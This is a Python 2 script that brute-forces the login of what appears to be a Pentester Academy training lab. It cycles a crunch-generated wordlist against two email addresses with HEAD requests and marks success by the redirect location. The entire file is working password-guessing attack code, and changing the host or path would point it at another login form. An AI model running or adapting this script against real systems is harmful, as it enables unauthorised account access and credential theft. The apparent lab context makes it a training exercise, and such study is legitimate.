#!/usr/bin/python

import httplib
import urllib
from termcolor import colored


U = ["admin@PentesterAcademy.com","nick@PentesterAcademy.com"]

'''
Use The Following Command To Generate wordlist
#crunch 5 5 mno -o wordlist.txt
'''

p = open('wordlist.txt','r')
P = [x.strip() for x in p.readlines()]
p.close()


url_base = "/lab/webapp/auth/1/loginscript"
url_method = "HEAD"

for UserName in U:
	for Pass in P:
		url_Conn = httplib.HTTPConnection("pentesteracademylab.appspot.com")
		args = {'email' : UserName, 'password' : Pass}
		url_args = urllib.urlencode(args)
		url_Conn.request(url_method,url_base+"?"+url_args)
		url_header = url_Conn.getresponse()
		if url_header.msg.headers[2].split(" ")[1].split("\r\n")[0] != "http://pentesteracademylab.appspot.com/lab/webapp/auth/1/login":
			print colored("Login with Username %s ... Password %s ... URL %s"%(UserName,Pass,url_header.msg.headers[2].split(" ")[1].split("\r\n")[0]),"green")
			break
		else:			
			print "Login with Username %s ... Password %s ... Failed!"%(UserName,Pass)
